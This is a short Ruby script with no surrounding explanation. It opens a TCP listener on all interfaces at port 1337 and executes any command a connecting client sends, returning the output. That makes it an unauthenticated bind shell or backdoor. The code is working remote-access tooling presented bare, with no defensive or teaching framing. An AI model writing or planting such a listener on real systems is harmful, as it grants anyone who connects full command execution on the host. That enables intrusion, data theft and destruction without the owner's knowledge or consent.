#!/usr/bin/env ruby

require 'socket'

server = TCPServer.open("0.0.0.0", 1337)
puts 'Listening on 0.0.0.0:1337'
client = server.accept

loop do
	client.puts "\n\nCommand to excute: \n\n"
	cmd = client.gets.chomp
	client.close if cmd == "exit"
	#output = system ( "#{cmd}" )
	output = `#{cmd}`
	client.puts output
	#client.close
end

